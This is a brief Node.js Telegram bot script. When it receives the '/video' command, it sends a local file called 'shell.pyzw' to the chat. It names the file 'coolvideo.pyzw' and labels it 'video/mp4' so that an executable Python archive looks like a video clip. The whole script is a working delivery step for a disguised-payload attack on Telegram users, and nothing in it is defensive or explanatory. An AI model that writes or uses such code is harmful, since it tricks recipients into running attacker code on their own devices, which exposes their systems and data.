const fs = require("fs");
const TelegramBot = require("node-telegram-bot-api");

const token = "*******:******_*************";

const bot = new TelegramBot(token, { polling: true });

bot.onText(/\/video/, (msg) => {
    const chatId = msg.chat.id;

    const videoStream = fs.createReadStream("shell.pyzw");

    bot.sendVideo(
        chatId,
        videoStream,
        {
            width: 300,
            height: 300,
            duration: 30,
        },
        {
            filename: "coolvideo.pyzw",
            contentType: "video/mp4"
        }
    ).then(() => {
        console.log("Video sent successfully");
    }).catch((err) => {
        console.error("Error sending video:", err.toString());
    });
});
